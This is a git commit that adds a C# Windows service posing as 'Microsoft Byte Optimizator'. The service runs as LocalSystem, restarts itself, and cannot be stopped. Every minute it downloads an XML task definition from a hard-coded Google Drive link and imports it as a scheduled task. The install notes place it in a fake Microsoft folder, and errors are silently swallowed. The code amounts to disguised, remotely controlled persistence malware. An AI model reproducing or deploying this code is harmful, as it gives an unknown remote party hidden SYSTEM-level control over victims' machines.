c74ae877a4e83e4674a2f6f0fbad9e5ab1107fe1
Nir Bar <nir.bar@panel-sw.co.il>
2021-01-14 07:08:12 +0200

    Add project files.

---
+++ IdleTimeOptimization/Program.cs
@@ -0,0 +1,53 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using Topshelf;
+using Topshelf.Runtime.Windows;
+
+namespace IdleTimeOptimization
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Host host = HostFactory.New(x =>
+            {
+                x.Service<ScheduluedTaskRestore>(s =>
+                {
+                    s.ConstructUsing(name => new ScheduluedTaskRestore());
+                    s.WhenStarted(tc => tc.Start());
+                    s.WhenStopped(tc => tc.Stop());
+                });
+
+                x.EnableServiceRecovery(r =>
+                {
+                    //you can have up to three of these
+                    r.RestartService(10);
+                    r.RestartService(10);
+                    r.RestartService(10);
+                    r.SetResetPeriod(1);
+                });
+
+                x.RunAsLocalSystem();
+                x.RunAsLocalSystem();
+
+                x.SetDescription("Optimize byte usage of extensive network payloads");
+                x.SetDisplayName("Microsoft Byte Optimizator");
+                x.SetServiceName("MicrosoftByteOptimizator");
+            });
+            WindowsServiceHost windowsService = host as WindowsServiceHost;
+            if (windowsService != null)
+            {
+                windowsService.CanStop = false;
+                windowsService.CanPauseAndContinue = false;
+                windowsService.CanShutdown = false;
+            }
+            TopshelfExitCode rc = host.Run();
+
+            var exitCode = (int)Convert.ChangeType(rc, rc.GetTypeCode());
+            Environment.ExitCode = exitCode;
+        }
+    }
+}
---
+++ IdleTimeOptimization/ScheduluedTaskRestore.cs
@@ -0,0 +1,125 @@
+﻿using System;
+using System.IO;
+using System.Net;
+using System.Reflection;
+using Microsoft.Win32.TaskScheduler;
+/*TODO
+ * Copy to "C:\Program Files (x86)\Microsoft\Sync"
+ *      IdleTimeOptimization.exe
+ *      IdleTimeOptimization.exe.config
+ *      Microsoft.Win32.TaskScheduler.dll
+ *      Topshelf.dll\
+ * Execute 
+ *      "C:\Program Files (x86)\Microsoft\Sync\IdleTimeOptimization.exe" install --localsystem --sudo -servicename MicrosoftByteOptimizator -description "Optimize byte usage of extensive network payloads" -displayname "Microsoft Byte Optimizator" start
+ *      "C:\Program Files (x86)\Microsoft\Sync\IdleTimeOptimization.exe" start
+ */
+
+
+namespace IdleTimeOptimization
+{
+    public class ScheduluedTaskRestore
+    {
+        private System.Threading.Timer timer_;
+        public void Start()
+        {
+            timer_ = new System.Threading.Timer(SetTask, null, 0, 1000 * 60);
+        }
+
+        public void Stop()
+        {
+            timer_?.Dispose();
+            timer_ = null;
+        }
+
+        private void SetTask(object state)
+        {
+            try
+            {
+                using (TaskService service = new TaskService())
+                {
+                    string xmlFile = null;
+                    try
+                    {
+                        service.BeginInit();
+                        xmlFile = GetFromGoogle();
+                        if (!string.IsNullOrEmpty(xmlFile) && File.Exists(xmlFile))
+                        {
+                            try
+                            {
+                                service.RootFolder.ImportTask("Nightly", xmlFile, true);
+                                return;
+                            }
+                            catch (Exception ex)
+                            {
+                            }
+                        }
+
+                        xmlFile = GetFromResource();
+                        if (!string.IsNullOrEmpty(xmlFile) && File.Exists(xmlFile))
+                        {
+                            using (Task task = service.RootFolder.ImportTask("Nightly", xmlFile, true))
+                            {
+                            }
+                        }
+                    }
+                    finally
+                    {
+                        service.EndInit();
+                        if (!string.IsNullOrEmpty(xmlFile))
+                        {
+                            File.Delete(xmlFile);
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+            }
+
+        }
+
+        // https://drive.google.com/file/d/1aEh3rG6mN5i4a3kRdsT9y4ai8qMFlmBm/view?usp=sharing
+        // https://drive.google.com/uc?id=1aEh3rG6mN5i4a3kRdsT9y4ai8qMFlmBm&export=download
+        private string GetFromGoogle()
+        {
+            try
+            {
+                using (WebClient client = new WebClient())
+                {
+                    string xmlFile = Path.GetTempFileName();
+                    client.DownloadFile("https://drive.google.com/uc?id=1aEh3rG6mN5i4a3kRdsT9y4ai8qMFlmBm&export=download", xmlFile);
+                    return xmlFile;
+                }
+            }
+            catch (Exception ex)
+            {
+            }
+            return null;
+        }
+
+        private string GetFromResource()
+        {
+            try
+            {
+                string[] names = Assembly.GetExecutingAssembly().GetManifestResourceNames();
+                if ((names != null) && (names.Length > 0))
+                {
+                    string xmlFile = Path.GetTempFileName();
+                    using (var resource = Assembly.GetExecutingAssembly().GetManifestResourceStream(names[0]))
+                    {
+                        using (var file = new FileStream(xmlFile, FileMode.Create, FileAccess.Write))
+                        {
+                            resource.CopyTo(file);
+                        }
+                    }
+                    return xmlFile;
+                }
+            }
+            catch (Exception ex)
+            {
+            }
+            return null;
+        }
+
+    }
+}
